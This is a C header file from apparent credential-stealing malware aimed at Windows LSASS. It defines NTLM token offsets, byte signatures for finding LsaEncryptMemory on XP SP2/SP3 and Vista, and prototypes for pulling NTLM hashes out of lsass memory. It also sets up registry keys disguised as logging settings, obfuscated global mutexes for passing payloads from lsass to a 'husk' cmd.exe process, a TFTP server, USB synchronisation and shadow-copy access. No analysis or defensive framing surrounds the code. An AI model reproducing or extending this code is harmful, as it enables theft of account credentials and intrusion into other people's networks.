
#define DEBUGw							send_debug_channelw

// Maximum number of tokens in memory (array) Fixme
#define MAX_TOKENS						1024

// The static definitions for the NTLM fake token
#define PLAINTEXT_PASS					L"for_anna_ilu"
#define NTLM_PASS						{	0xBF, 0xB1, 0x69, 0x62,	0x64, 0x4C, 0x22, 0xF7,	0x82, 0x18, 0x26, 0xB3,	0xAB, 0x09, 0xF6, 0xFC }
#define HUSK_PROCESS					L"C:\\windows\\system32\\cmd.exe"

// Static sizes for NTLM token sizes
#ifndef _WIN64
#define NTLM_TOKEN_6_SIZE				0x70
#define NTLM_TOKEN_5_SIZE				0x70
#else
#define NTLM_TOKEN_6_SIZE				0x98
#define NTLM_TOKEN_5_SIZE				0x98
#endif
#define NTLM_HASH_SIZE					16

// Maximum size of the token pool (FIXME)
#define TOKEN_POOL_SIZE					0xa000

// Other constants
#define USER_SUM_BUF_SIZE				0x8000			// FIXME
#define NTLM_SESSION_LENGTH				15

// Event objects and registry keys
#define TFTPD_COMPLETE					"Global\\89sd7f78h9sdh"

#define EXE_TO_DLL_ERROR				"Global\\f8s88fs8d98sf" // FIXME - autogenerate 
#define EXE_TO_DLL_LOCK					"Global\\789fyg7y8789d"
#define HUSK_READY_SIGNAL				"Global\\8sdf8sah3234s" // Synchronizes the husk and lsass
#define TFTPD_READY_MUTEX				"Global\\4950340958309" // signals completion of the tftpd server
#define LSASS_TO_HUSK_PAYLOAD_MUTEX		"Global\\4905740570340"	// allows the husk to copy a payload from lsass into itself
#define LSASS_TO_HUSK_PAYLOAD_MAPPING	"Global\\8FDHG9DQHG98H" // a handle to the file mapping
#define SCANNET_TO_LSASS_DC_OBJECT		"Global\\98JDF98GJD9FJ" // Check globals.h
#define SYNC_USB_BETWEEN_PROC			"Global\\s8jdf9sjdf98j" // Check usb.c

#define HUSK_KEY_HIVE					HKEY_LOCAL_MACHINE
#define HUSK_SUBKEY						"system\\logging"
#define HUSK_NAME						"log_status"

#define MAX_NUMBER_OF_LSASS_HEAPS		40960

#define TFTP_INSTALL_WAIT				5000

#define HUSK_ERROR_TRUE					TRUE
#define HUSK_ERROR_FALSE				FALSE

#define TARGET_KEY_HIVE					HKEY_LOCAL_MACHINE
#define TARGET_SUBKEY					"system\\settings"
#define	TARGET_NAME						"settings_status"

#define TFTPD_RC_HIVE					HKEY_LOCAL_MACHINE
#define TFTPD_RC_SUBKEY					"system\\logging2"
#define TFTPD_RC_NAME					"log_rotation"

#define SECRET_PHYSICAL_SIZE			24
#ifndef _WIN64
#define MAX_DLL_BASE					0x7fffffff
#define PRIMARY_STRING_DELTA			12
#define MEMORY_BASIC_INFORMATIONX		MEMORY_BASIC_INFORMATION
#define SECRET_MAX_PAGE_ADDRESS			0xf0000000
#define PAGE_BOUND						0xffff0000
#else
#define MAX_DLL_BASE					0x7fffffff
#define PRIMARY_STRING_DELTA			24
#define MEMORY_BASIC_INFORMATIONX		MEMORY_BASIC_INFORMATION64
#define SECRET_MAX_PAGE_ADDRESS			0xf000000000000000
#define PAGE_BOUND						0xffffffffffff0000
#endif

// Session Token offsets (decrypted)
#ifndef _WIN64
#define TOKEN_OFFSET_NTLM				32
#define TOKEN_OFFSET_SESSION			16
#define TOKEN_OFFSET_DOMAIN				72
#define TOKEN_OFFSET_USER				12
#else
#define TOKEN_OFFSET_NTLM				48
#define TOKEN_OFFSET_SESSION			32
#define TOKEN_OFFSET_DOMAIN				88
#define TOKEN_OFFSET_USER				24
#endif

// Key is used to notify cmd of the payload waiting to be transferred from lsass
#define PAYLOAD_SIZE_HIVE				HKEY_LOCAL_MACHINE
#define PAYLOAD_SIZE_SUBKEY				"system\\logging3"
#define PAYLOAD_SIZE_NAME				"misinformation"

// XP Service pack sigs
#define LSA_SIG_XP					{	0x8b, 0xff, 0x55, 0x8b, 0xec, 0x6a, 0x00, 0xff, 0x75, 0x0c, 0xff, 0x75, 0x08, 0xe8, 0x3f, 0xfe, 0xff, 0xff, 0x5d, 0xc2, 0x08, 0x00 }

#define LSA_SIG_XP_SP2				{	0x8b, 0xff, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x10, 0x01, 0x00, 0x00, 0xa1, 0x58, 0xf1, 0x7c, 0x75, 0x56, 0x8b, 0x75, 0x08, 0x85, 0xf6, 0x89, 0x45, 0xfc }
		
/*
8B FF                      mov     edi, edi
55                         push    ebp
8B EC                      mov     ebp, esp
81 EC 10 01 00 00          sub     esp, 110h       ; Integer Subtraction
A1 58 01 7D 75             mov     eax, ___security_cookie
56                         push    esi
8B 75 08                   mov     esi, [ebp+arg_0]
85 F6                      test    esi, esi        ; Logical Compare
89 45 FC                   mov     [ebp+var_4], eax
57                         push    edi
74 53                      jz      short loc_7573FE5B ; Jump if Zero (ZF=1)
*/

#define LSA_SIG_XP_SP3				{	0x8b, 0xff, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x10, 0x01, 0x00, 0x00, 0xa1, 0x58, 0x01, 0x7d, 0x75, 0x56, 0x8b, 0x75, 0x08, 0x85, 0xf6, 0x89, 0x45, 0xfc, 0x57, 0x74, 0x53 }	

/*
8B FF                      mov     edi, edi
55                         push    ebp
8B EC                      mov     ebp, esp
81 EC 10 01 00 00          sub     esp, 110h       ; Integer Subtraction
A1 D0 70 11 73             mov     eax, ___security_cookie
33 C5                      xor     eax, ebp        ; Logical Exclusive OR
89 45 FC                   mov     [ebp+var_4], eax
56                         push    esi
8B 75 08                   mov     esi, [ebp+arg_0]
85 F6                      test    esi, esi        ; Logical Compare
74 53                      jz      short loc_730180B0 ; Jump if Zero (ZF=1)*/
//#define LSA_SIG_VISTA				{	0x33, 0xc5, 0x89, 0x45, 0xfc, 0x56, 0x8b, 0x75, 0x08, 0x85, 0xf6, 0x74, 0x53, 0x53, 0x8b, 0x5d, 0x0c, 0x85, 0xdb, 0x74, 0x4a, 0xf6, 0xc3, 0x07, 0x0f, 0x85, 0x89, 0xe0, 0x03, 0x00}
// Note: Since the 0xa1 instruction is relocated (ASLR), this sig will be looked for in two parts. 
// Defined in lsass6_find_lsaencryptmemory()

#define SP3_STRING						"Service Pack 3"
#define SP2_STRING						"Service Pack 2"
#define SP1_STRING						"Service Pack 1"

#define SHADOW_SYM_LINK					L"\\\\?\\GLOBALROOT\\HarddiskVolumeShadowCopy3"

typedef struct ntlm_token {
	DWORD				*raw_token;
	DWORD				*decrypted_token;
	char				*primary_string;
	BYTE				*ntlm;
	BYTE				*session;
	wchar_t				*domain;
	wchar_t				*user;
	HANDLE				heap;
	DWORD				*original_decrypted_token;
} NTLM_TOKEN, *PNTLM_TOKEN;

// lsass 6 Prototypes
BOOL		open_shadow_copy(VOID);
VOID		debug_copy_lsass(VOID);
VOID		lsass_procedure(VOID);
BOOL		lsass_encrypt_token(CHAR out_buffer[NTLM_TOKEN_6_SIZE], PBYTE buffer);
VOID		find_ntlm_tokens(	PNTLM_TOKEN token_structure[MAX_TOKENS],
								BOOL (*decrypter)(PNTLM_TOKEN *, PCHAR),
								UINT token_size);
VOID		lsass_get_secret(PBYTE secret_out);
BOOL		lsass_extract_hash_from_token(PNTLM_TOKEN *token_structure, PCHAR primary_token);
VOID		lsass_sort_tokens(PNTLM_TOKEN ntlm_tokens[MAX_TOKENS], PDWORD used_tokens, PDWORD used_husk_tokens);
BYTE		lsass_get_key_offset(VOID);
BOOL		lsass_extract_hash_from_token_vista(PNTLM_TOKEN *token_structure, PCHAR primary_token);
VOID		lsass6_find_lsaencryptmemory(VOID);

// lsass 5 Prototypes
VOID		lsass_procedure5(VOID);
VOID		find_ntlm_tokens5(PNTLM_TOKEN token_structure[MAX_TOKENS]);
PNTLM_TOKEN lsass5_extract_token(PDWORD token);
VOID		lsass5_find_cbc(VOID);
VOID		lsass5_find_lsaencryptmemory(VOID);
VOID		lsass5_remove_dup_tokens(PNTLM_TOKEN ntlm_tokens[MAX_TOKENS]);
VOID		lsass5_remove_used_tokens(PDWORD token_pool, PNTLM_TOKEN ntlm_tokens[MAX_TOKENS]);